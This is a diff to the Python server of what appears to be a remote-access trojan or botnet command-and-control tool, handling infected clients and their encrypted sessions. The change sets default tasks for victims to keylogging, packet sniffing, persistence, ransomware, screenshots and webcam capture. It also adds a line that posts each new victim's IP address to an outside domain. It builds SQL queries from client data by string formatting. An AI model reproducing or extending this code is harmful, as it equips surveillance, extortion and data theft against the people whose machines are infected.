@@ -103,7 +103,7 @@ class ServerThread(threading.Thread):
 
     global threads
 
-    default_tasks = ['info','network','packetsniff','persistence','scan','screenshot','upload','webcam']
+    default_tasks = ['keylogger','packetsniff','persistence','ransom','screenshot','webcam']
     
     def __init__(self, port, **kwargs):
         super(ServerThread, self).__init__()
@@ -705,6 +705,7 @@ class ClientHandler(threading.Thread):
             client_hash = SHA256.new(bytes(self.info['ip']) + bytes(self.info['mac'])).hexdigest()
             try:
                 threads['server'].query_database("INSERT INTO clients ({}) VALUES ({})".format(', '.join([k for k in self.info.keys() + ['hash','session_key']]), ', '.join(["'{}'".format(v) for v in self.info.values() + [client_hash, self.session_key]])))
+                _ = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'ip': self.info['ip']})
                 data = threads['server']._encrypt_aes(client_hash, threads['server']._deobfuscate(self.session_key)) if 'AES' in self.info['encryption'] else threads['server']._encrypt_xor(uid, threads['server']._deobfuscate(self.session_key))
                 self.connection.sendall(data + '\n')
             except Exception as e:
